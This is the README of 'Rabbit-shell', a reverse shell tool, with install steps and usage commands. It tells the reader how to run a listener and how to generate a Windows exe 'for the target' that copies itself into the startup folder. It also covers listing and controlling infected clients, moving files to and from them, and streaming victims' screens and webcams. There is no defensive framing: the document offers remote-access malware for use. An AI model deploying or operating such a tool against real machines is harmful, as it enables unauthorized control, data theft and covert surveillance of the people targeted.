# Rabbit-shell

###### Rabbit shell reverse shell tool.



##  Installation.



### By pip.

```bash
pip install rabbit_shell
```
install using pypi.

or
###  By clone.

```bash
git clone https://github.com/greedalbadi/rabbit-shell.git
cd rabbit-shell
pip install .
```
install using git clone.

# Usage.
```bash
rsb --help
```
print available arguments with a tiny explain or just rsb.

## Run server and start listening.

```bash
rsb --server -a 192.168.0.111 -p 9999
```

> - --server is args container
> - -a is server or device ip address
> - -p is wich port you'll be listening to

###### There'll be a seperate socket for file transfering the port is whaever enter - 1, If main server port 9999

###### file transfer port well be 9998, the files are going to trans to wherever your location is.





## Log to server as author.

```bash
rsb --auth -a 192.168.0.111 -p 9999
```

> - --auth is args container
> - -a is server or device ip address
> - -p is wich port you'll be listening to server and contacts
> - -k (optional) use key

###### connect to your server as an author and control your own clients.



## Generate exe for the target.

```bash
rsb --client -a 192.168.0.111 -p 9999
```

> - --client is args container
> - -a is server or device ip address
> - -p is wich port you'll be listening to


###### This will generate an exe inside a dist directory you may delete build folder, when the exe runs It'll create

###### a shortcut in startup folder if the system is windows.



## Generate new key.

```bash
rsb --key
```

###### generate a new key and save it in data\basic.py.



## To insert key.

```bash
rsb --key -k your_key
```

> - -k is the key you want to insert to the tool files.

## Commands to use from server side.



### To request server information.

```bash
>: server
```

###### Server host and port also the tool version and tool name.

### To list all clients.

```bash
>: list
```

###### List online and offline clients use, device address, and more.

### To set and controll a client console by client use number from the list.

```
>: set 0
```

###### To controle client console you can git client set number from using the command list

###### and use the command >: set (client use number).

### Quit client session.

```bash
>: quit
```

###### Quit client console without losing connection with client, used to things like changing to another set or gain info.

### Send file to client.

```bash
>: file:filename
```

###### 

### Request file from client.

```bash
reqfile:filename
```





# stream



##### streaming will be done by wich client is sending frames to the server

##### so make sure that it's one client whom send's stream frames and stop other streams to be safe, after you'r done with the stream stop it using `>: stream:stop` .

### stream current client screen.

```bash
>: stream:screen
```



### stream current client webcam.

```bash
>: stream:cam
```



### stop stream

```bash
>: stream:stop
```

###### make sure you stop the stream when you want to start streaming another client.







## About.

by [@greedalbadi](https://www.instagram.com/greedalbadi/)

This tool uses MIT license.

made with depression <3
